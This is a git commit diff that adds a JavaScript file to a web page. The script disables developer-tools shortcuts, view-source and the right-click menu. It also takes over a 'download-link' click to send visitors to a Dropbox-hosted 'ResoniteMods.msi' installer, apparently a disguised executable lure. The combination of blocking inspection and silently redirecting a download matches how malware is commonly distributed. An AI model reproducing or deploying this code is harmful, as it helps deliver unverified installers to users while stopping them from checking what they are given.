b29e0aa9fddc82fa7319915c1399ee17060b7a23
deazy17x <canisstrong@gmail.com>
2025-10-04 01:36:15 +0300

    Add files via upload

---
+++ page_content/js/devtools-protector.js
@@ -0,0 +1,29 @@
+// DevTools'u engellemek için basit bir betik
+(function() {
+    // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C gibi tuş kombinasyonlarını engelle
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode === 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) || // Ctrl+Shift+J
+            (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) || // Ctrl+Shift+C
+            (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) // Ctrl+U
+        ) {
+            return false;
+        }
+    };
+
+    // Sağ tıklama menüsünü engelle
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+    document.addEventListener('DOMContentLoaded', function() {
+        const downloadLink = document.getElementById('download-link');
+        if (downloadLink) {
+            downloadLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://www.dropbox.com/scl/fi/40tkdszusamy95ykggk5n/ResoniteMods.msi?rlkey=r867patlw2u262e6msewvpjh7&st=ekt687rx&dl=1';
+            });
+        }
+    });
+})();
